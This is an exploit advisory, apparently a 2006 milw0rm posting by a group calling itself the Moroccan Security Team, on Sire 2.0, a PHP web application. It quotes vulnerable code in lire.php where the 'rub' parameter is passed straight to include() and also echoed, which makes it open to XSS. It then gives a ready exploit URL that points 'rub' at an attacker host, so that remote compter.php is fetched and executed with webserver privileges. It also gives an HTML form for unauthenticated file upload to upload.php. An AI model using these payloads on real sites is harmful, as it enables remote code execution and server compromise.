<html><head><title>Sire 2.0 (lire.php) Remote File Inclusion/Arbitary File Upload Vulnerability</title></head><pre>[+]File Inclusion:
       Input passed to the &quot;rub&quot; parameter in &quot;lire.php&quot; isn't properly verified,
       before it is used to include remote files
       Successful exploitation requires that &quot;register_globals&quot; is enabled.

[lire.php code]
&lt;?
       73              if(empty($_GET[&quot;rub&quot;])){$rub=rtrim($rubriques[0]);} else {$rub=$_GET[&quot;rub&quot;];}
       75              include($rub.&quot;/compter.php&quot;); ## File Inclusion !!

       298             echo $rub; ## XSS
?&gt;

[+]Exploit: Exploit http://[trajet]/lire.php?rub=http://[attacker]&amp;cahier=1&amp;art=1
[+]http://[attacker]/compter.php Will be Included And Executed withe the privilege of the webserver


File Upload
Remote User can Upload jpg,jpeg,gif,bmp files without Identification ,
[upload.php code:]
&lt;?
if( isset($_POST['upload']) ) // si formulaire soumis
{
#Upload code ....
}
?&gt;
Exploit :

&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; action=&quot;http://Trajet/upload.php?&quot;&gt;
Download File&lt;br&gt;
&lt;input name=&quot;fichier&quot; type=&quot;file&quot; size=&quot;48&quot;&gt;&lt;br&gt;
&lt;input type=&quot;submit&quot; name=&quot;upload&quot; value=&quot;uploader&quot;&gt;&lt;form&gt;

[Moroccan Security Team]

contact:
simo64[at]gmail[dot]com

# milw0rm.com [2006-04-09]</pre></html>